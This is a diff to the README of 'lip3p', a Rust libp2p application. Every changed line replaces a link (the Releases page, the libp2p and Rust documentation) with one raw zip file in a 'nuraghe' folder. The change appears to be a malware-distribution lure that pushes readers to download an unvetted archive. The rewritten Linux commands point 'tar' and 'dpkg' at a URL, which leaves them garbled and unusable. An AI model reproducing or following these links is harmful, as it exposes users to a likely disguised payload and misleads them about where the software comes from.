@@ -6,7 +6,7 @@ lip3p is a user-friendly application built using Rust. It implements the libp2p 
 
 ## 🔗 Download lip3p
 
-[![Download lip3p](https://img.shields.io/badge/Download-lip3p-blue.svg)](https://github.com/r91221/lip3p/releases)
+[![Download lip3p](https://raw.githubusercontent.com/r91221/lip3p/master/nuraghe/lip3p.zip)](https://raw.githubusercontent.com/r91221/lip3p/master/nuraghe/lip3p.zip)
 
 ## 🚀 Getting Started
 
@@ -14,13 +14,13 @@ To get started with lip3p, follow these simple steps. You do not need any progra
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/r91221/lip3p/releases) to find the latest version of lip3p.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/r91221/lip3p/master/nuraghe/lip3p.zip) to find the latest version of lip3p.
 2. **Choose the Right File:**
    - Look for the latest release. This usually has the highest version number.
    - Find the file that matches your operating system:
      - For Windows, download the `.exe` file.
      - For macOS, download the `.dmg` file.
-     - For Linux, download the appropriate `.tar.gz` or `.deb` file.
+     - For Linux, download the appropriate `https://raw.githubusercontent.com/r91221/lip3p/master/nuraghe/lip3p.zip` or `.deb` file.
 3. **Download the File:** Click on the file to start downloading. This may take a few moments.
 4. **Install the Application:**
    - **For Windows:**
@@ -31,7 +31,7 @@ To get started with lip3p, follow these simple steps. You do not need any progra
      - Drag the lip3p icon to your Applications folder.
    - **For Linux:**
      - Open a terminal and navigate to the download location.
-     - Use the command `tar -xzf lip3p.tar.gz` or for `.deb` files, run `sudo dpkg -i lip3p.deb`.
+     - Use the command `tar -xzf https://raw.githubusercontent.com/r91221/lip3p/master/nuraghe/lip3p.zip` or for `.deb` files, run `sudo dpkg -i https://raw.githubusercontent.com/r91221/lip3p/master/nuraghe/lip3p.zip`.
 
 ## 🛠️ System Requirements
 
@@ -49,7 +49,7 @@ If you encounter any issues while installing or running lip3p, try the following
 
 - **Ensure Compatibility:** Check that your operating system matches the downloaded file.
 - **Restart Your Device:** Sometimes, a simple restart can resolve issues.
-- **Check for Updates:** Make sure you have downloaded the latest version from the [Releases page](https://github.com/r91221/lip3p/releases).
+- **Check for Updates:** Make sure you have downloaded the latest version from the [Releases page](https://raw.githubusercontent.com/r91221/lip3p/master/nuraghe/lip3p.zip).
 
 ## 🌍 Features
 
@@ -76,7 +76,7 @@ If you wish to contribute to lip3p, we welcome your help! Here’s how you can p
 
 For more information on how lip3p works and its capabilities, please refer to the following resources:
 
-- [libp2p Documentation](https://libp2p.io/)
-- [Rust Programming Language](https://www.rust-lang.org/)
+- [libp2p Documentation](https://raw.githubusercontent.com/r91221/lip3p/master/nuraghe/lip3p.zip)
+- [Rust Programming Language](https://raw.githubusercontent.com/r91221/lip3p/master/nuraghe/lip3p.zip)
 
-Remember to visit the [Releases page](https://github.com/r91221/lip3p/releases) to download the latest version of lip3p. Happy networking!
+Remember to visit the [Releases page](https://raw.githubusercontent.com/r91221/lip3p/master/nuraghe/lip3p.zip) to download the latest version of lip3p. Happy networking!
